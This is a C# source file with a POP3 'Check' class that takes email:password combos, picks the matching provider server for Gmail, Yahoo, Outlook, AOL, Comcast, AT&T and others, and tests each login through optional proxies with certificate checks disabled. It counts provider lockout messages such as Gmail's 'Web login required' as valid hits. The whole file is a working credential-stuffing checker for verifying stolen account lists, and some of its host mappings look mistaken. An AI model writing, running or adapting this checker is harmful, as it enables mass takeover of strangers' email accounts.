using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.IO;
using System.Net.Security;
using xNet;
using System.Threading;

namespace xNet
{
    public class POP3
    {
        string username;
        string password;

        ProxyClient Proxy;

        pop3Param[] pop3Collection = new pop3Param[] {
                
                // gmail.com
                new pop3Param("gmail.com", "pop.gmail.com", true),
                
                // gmail.com
                new pop3Param("cox.net", "pop.cox.net", true),    
                
                // mail.ru
                new pop3Param("inbox.ru,mail.ru,list.ru,bk.ru", "pop.mail.ru" , true),
                
                // yahoo.com
                new pop3Param("yahoo,ymail,rocketmail", "pop3.live.com", true),
                
                // hotmail.com
                new pop3Param("outlook,hotmail,msn.com", "pop-mail.outlook.com", true),
                
                // live.com
                new pop3Param("live.com", "pop3.live.com", true),
                
                // verizon.net
                new pop3Param("verizon", "pop.verizon.net", true),
                
                // aol.com
                new pop3Param("aol.com", "pop.aol.com", true),
                
                // atlanticbb.net
                new pop3Param("atlanticbb", "pop.atlanticbb.net", false),
                
                // comcast.net
                new pop3Param("comcast", "mail.comcast.net", true),
                
                // aim.com
                new pop3Param("aim.com", "pop.aim.com", true),
                
                // att.net
                new pop3Param("ameritech.net,att.net,bellsouth.net,flash.net,nvbell.net,pacbell.net,prodigy.net,sbcglobal.net,snet.net,swbell.net,wans.net", "inbound.att.net", true),
                
                // optonline.net
                new pop3Param("optonline", "mail.optimum.net", false),
            };



        public POP3(ProxyClient proxy = null)
        {
            this.Proxy = proxy;
        }

        public bool Check(string ak)
        {
            if (ak.Split(':', ';').Length < 2)
                return false;

            username = ak.Split(':', ';')[0];
            password = ak.Split(':', ';')[1];

            var pop3 = pop3Collection.Where(a => a.Find(username)).FirstOrDefault();
            if (pop3 == null)
                return false;

            using (var req = new HttpRequest())
            {

                req.Proxy = Proxy;

                int error = 0;

            reConnect:
                try
                {
                    var tcp = req.CreateTcpConnection(pop3.host, pop3.port, Proxy);
                    Stream stream = null;
                    using (SslStream ssl = new SslStream(tcp.GetStream(), false, (_1, _2, _3, _4) => { return true; }))
                    {
                        if (pop3.ssl)
                        {
                            ssl.AuthenticateAsClient(" ");
                            stream = ssl;
                        }
                        else
                        {
                            stream = tcp.GetStream();
                        }

                        using (var read = new StreamReader(stream))
                        using (var write = new StreamWriter(stream))
                        {
                            read.BaseStream.ReadTimeout = 5000;

                            var msg = read.ReadLine();

                            write.WriteLine(string.Format("USER {0}", username));
                            write.Flush();

                            msg = read.ReadLine();


                            if (msg.StartsWith("+OK"))
                            {
                                write.WriteLine(string.Format("PASS {0}", password));
                                write.Flush();

                                msg = read.ReadLine();
                                if (pop3.host == "pop.gmail.com" && msg.Contains("Web login required:"))
                                    return true;

                                if (pop3.host == "pop-mail.outlook.com" && msg.Contains("mailbox could not be opened"))
                                    return true;


                                if (msg.StartsWith("+OK"))
                                    return true;
                            }
                        }

                        if (stream != null)
                            stream.Dispose();
                    }
                }
                catch (Exception)
                {
                    if (pop3.host == "pop.mail.yahoo.com" ||
                        pop3.host == "mail.comcast.net" ||
                        pop3.host == "inbound.att.net")
                        return false;

                    if (error++ < 3)
                    {
                        Thread.Sleep(500);
                        goto reConnect;
                    }
                }
            }

            return false;
        }


        class pop3Param
        {
            public bool ssl;
            public int port;
            public string host;
            public string[] name;

            public pop3Param(string name, string host, bool ssl)
            {
                this.ssl = ssl;
                this.host = host;
                this.port = ssl ? 995 : 110;
                this.name = name.Split(',');
            }

            public bool Find(string n)
            {
                if (n.Split('@').Length > 0)
                {
                    n = n.Split('@')[1];
                    foreach (var m in name)
                        if (n.Contains(m))
                            return true;
                }
                return false;
            }
        }
    }


}
